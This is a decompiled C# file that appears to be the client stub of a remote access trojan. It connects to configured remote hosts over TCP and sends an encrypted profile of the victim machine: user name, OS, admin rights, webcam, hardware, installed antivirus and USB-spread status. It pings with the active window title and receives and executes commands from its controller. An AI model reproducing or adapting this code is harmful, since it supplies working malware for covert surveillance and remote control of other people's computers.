using System;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

namespace Stub
{
	public class ClientSocket
	{
		public static bool isConnected = false;

		public static Socket S = null;

		private static long BufferLength = 0L;

		private static byte[] Buffer;

		private static MemoryStream MS = null;

		private static Timer Tick = null;

		public static ManualResetEvent allDone = new ManualResetEvent(initialState: false);

		private static object SendSync = null;

		public static Timer Speed;

		public static int Interval;

		public static bool ActivatePong;

		public static void BeginConnect()
		{
			try
			{
				string text = Settings.Hosts.Split(new char[1] { ',' })[new Random().Next(Settings.Hosts.Split(new char[1] { ',' }).Length)];
				if (Helper.IsValidDomainName(text))
				{
					IPAddress[] hostAddresses = Dns.GetHostAddresses(text);
					IPAddress[] array = hostAddresses;
					foreach (IPAddress iPAddress in array)
					{
						try
						{
							ConnectServer(iPAddress.ToString());
							if (isConnected)
							{
								break;
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
				}
				else
				{
					ConnectServer(text);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}

		public static object ConnectServer(string H)
		{
			object result = default(object);
			try
			{
				S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				BufferLength = -1L;
				Buffer = new byte[1];
				MS = new MemoryStream();
				S.ReceiveBufferSize = 51200;
				S.SendBufferSize = 51200;
				S.Connect(H, Conversions.ToInteger(Settings.Port));
				Settings.Host = H;
				isConnected = true;
				SendSync = RuntimeHelpers.GetObjectValue(new object());
				Send(Conversions.ToString(Info()));
				ActivatePong = false;
				S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, BeginReceive, null);
				TimerCallback callback = delegate
				{
					Ping();
				};
				Tick = new Timer(callback, null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
				Speed = new Timer(Pong, null, 1, 1);
				return result;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				isConnected = false;
				ProjectData.ClearProjectError();
				return result;
			}
			finally
			{
				allDone.Set();
			}
		}

		public static object Info()
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_0006: Expected O, but got Unknown
			ComputerInfo val = new ComputerInfo();
			return string.Concat("INFO", Settings.SPL, Helper.ID(), Settings.SPL, Environment.UserName, Settings.SPL, val.get_OSFullName().Replace("Microsoft", null), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString().Replace("False", "32bit").Replace("True", "64bit"), Settings.SPL, Settings.Groub, Settings.SPL, INDATE(), Settings.SPL, Spread(), Settings.SPL, UAC(), Settings.SPL, Messages.Cam(), Settings.SPL, CPU(), Settings.SPL, GPU(), Settings.SPL, RAM(), Settings.SPL, Antivirus());
		}

		public static string INDATE()
		{
			//Discarded unreachable code: IL_0021, IL_0037
			try
			{
				FileInfo fileInfo = new FileInfo(Helper.current);
				return fileInfo.LastWriteTime.ToString("dd/MM/yyy");
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				string result = "Error";
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string Spread()
		{
			//Discarded unreachable code: IL_0020, IL_002a, IL_0040
			try
			{
				if (Operators.CompareString(Path.GetFileName(Helper.current), Settings.USBNM, false) == 0)
				{
					return "True";
				}
				return "False";
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				string result = "Error";
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string UAC()
		{
			//Discarded unreachable code: IL_001f, IL_0035
			try
			{
				return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				string result = "Error";
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string Antivirus()
		{
			//Discarded unreachable code: IL_00a3, IL_00af, IL_00c6
			//IL_0019: Unknown result type (might be due to invalid IL or missing references)
			//IL_001f: Expected O, but got Unknown
			try
			{
				ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
				try
				{
					StringBuilder stringBuilder = new StringBuilder();
					ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
					try
					{
						enumerator = val.Get().GetEnumerator();
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current = enumerator.get_Current();
							stringBuilder.Append(current.get_Item("displayName").ToString());
							stringBuilder.Append(",");
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
					if (stringBuilder.ToString().Length == 0)
					{
						return "None";
					}
					return stringBuilder.ToString().Substring(0, checked(stringBuilder.Length - 1));
				}
				finally
				{
					((IDisposable)val)?.Dispose();
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				string result = "None";
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string GPU()
		{
			//Discarded unreachable code: IL_0072, IL_0086
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0011: Expected O, but got Unknown
			//IL_0012: Unknown result type (might be due to invalid IL or missing references)
			//IL_0018: Expected O, but got Unknown
			//IL_002e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0035: Expected O, but got Unknown
			try
			{
				string text = string.Empty;
				ObjectQuery val = new ObjectQuery("SELECT * FROM Win32_VideoController");
				ManagementObjectSearcher val2 = new ManagementObjectSearcher(val);
				ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
				try
				{
					enumerator = val2.Get().GetEnumerator();
					while (enumerator.MoveNext())
					{
						ManagementObject val3 = (ManagementObject)enumerator.get_Current();
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)text, ((ManagementBaseObject)val3).get_Item("Name")), (object)" "));
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				return text;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = "Error";
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string CPU()
		{
			//Discarded unreachable code: IL_0051, IL_0064, IL_007a
			//IL_0005: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Expected O, but got Unknown
			try
			{
				ManagementObject val = new ManagementObject("Win32_Processor.deviceid=\"CPU0\"");
				val.Get();
				return ((ManagementBaseObject)val).get_Item("Name").ToString()!.Replace("(R)", "").Replace("Core(TM)", "").Replace("CPU", "");
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				string result = "Error";
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string RAM()
		{
			//Discarded unreachable code: IL_009a, IL_00b0
			checked
			{
				try
				{
					string result = null;
					long num = (long)Math.Round(Conversion.Val((object)((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory()));
					if (num > 1073741824)
					{
						result = ((double)num / 1073741824.0).ToString();
						result = result.Remove(4, result.Length - 4) + " GB";
					}
					else if (num > 1048576)
					{
						result = ((double)num / 1048576.0).ToString();
						result = result.Remove(4, result.Length - 4) + " MB";
					}
					return result;
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					string result2 = "Error";
					ProjectData.ClearProjectError();
					return result2;
				}
			}
		}

		public static void BeginReceive(IAsyncResult ar)
		{
			//Discarded unreachable code: IL_01bd
			if (!isConnected)
			{
				return;
			}
			checked
			{
				try
				{
					int num = S.EndReceive(ar);
					if (num > 0)
					{
						if (BufferLength == -1)
						{
							if (Buffer[0] == 0)
							{
								BufferLength = Conversions.ToLong(Helper.BS(MS.ToArray()));
								MS.Dispose();
								MS = new MemoryStream();
								if (BufferLength == 0)
								{
									BufferLength = -1L;
									S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, BeginReceive, S);
									return;
								}
								Buffer = new byte[(int)(BufferLength - 1) + 1];
							}
							else
							{
								MS.WriteByte(Buffer[0]);
							}
						}
						else
						{
							MS.Write(Buffer, 0, num);
							if (MS.Length == BufferLength)
							{
								object obj = new Thread(delegate(object a0)
								{
									BeginRead((byte[])a0);
								});
								NewLateBinding.LateCall(obj, (Type)null, "Start", new object[1] { MS.ToArray() }, (string[])null, (Type[])null, (bool[])null, true);
								BufferLength = -1L;
								MS.Dispose();
								MS = new MemoryStream();
								Buffer = new byte[1];
							}
							else
							{
								Buffer = new byte[(int)(BufferLength - MS.Length - 1) + 1];
							}
						}
						S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, BeginReceive, S);
					}
					else
					{
						isConnected = false;
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					isConnected = false;
					ProjectData.ClearProjectError();
				}
			}
		}

		public static void BeginRead(byte[] b)
		{
			try
			{
				Messages.Read(b);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}

		public static void Send(string msg)
		{
			object sendSync = SendSync;
			ObjectFlowControl.CheckForSyncLockOnValueType(sendSync);
			bool lockTaken = false;
			try
			{
				Monitor.Enter(sendSync, ref lockTaken);
				if (!isConnected)
				{
					return;
				}
				try
				{
					using MemoryStream memoryStream = new MemoryStream();
					byte[] array = Helper.AES_Encryptor(Helper.SB(msg));
					byte[] array2 = Helper.SB(Conversions.ToString(array.Length) + "\0");
					memoryStream.Write(array2, 0, array2.Length);
					memoryStream.Write(array, 0, array.Length);
					S.Poll(-1, SelectMode.SelectWrite);
					S.BeginSend(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None, EndSend, null);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					isConnected = false;
					ProjectData.ClearProjectError();
				}
			}
			finally
			{
				if (lockTaken)
				{
					Monitor.Exit(sendSync);
				}
			}
		}

		public static void EndSend(IAsyncResult ar)
		{
			try
			{
				S.EndSend(ar);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				isConnected = false;
				ProjectData.ClearProjectError();
			}
		}

		public static void isDisconnected()
		{
			if (Tick != null)
			{
				try
				{
					Tick.Dispose();
					Tick = null;
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
			}
			if (Speed != null)
			{
				try
				{
					Speed.Dispose();
					Speed = null;
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					ProjectData.ClearProjectError();
				}
			}
			if (MS != null)
			{
				try
				{
					MS.Close();
					MS.Dispose();
					MS = null;
				}
				catch (Exception ex5)
				{
					ProjectData.SetProjectError(ex5);
					Exception ex6 = ex5;
					ProjectData.ClearProjectError();
				}
			}
			if (S != null)
			{
				try
				{
					S.Close();
					S.Dispose();
					S = null;
				}
				catch (Exception ex7)
				{
					ProjectData.SetProjectError(ex7);
					Exception ex8 = ex7;
					ProjectData.ClearProjectError();
				}
			}
			GC.Collect();
		}

		public static void Pong(object obj)
		{
			checked
			{
				try
				{
					if (ActivatePong && isConnected)
					{
						Interval++;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		public static void Ping()
		{
			try
			{
				if (isConnected)
				{
					Send("PING!" + Settings.SPL + Helper.GetActiveWindowTitle() + Settings.SPL + Helper.Time);
					ActivatePong = true;
					GC.Collect();
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}
}
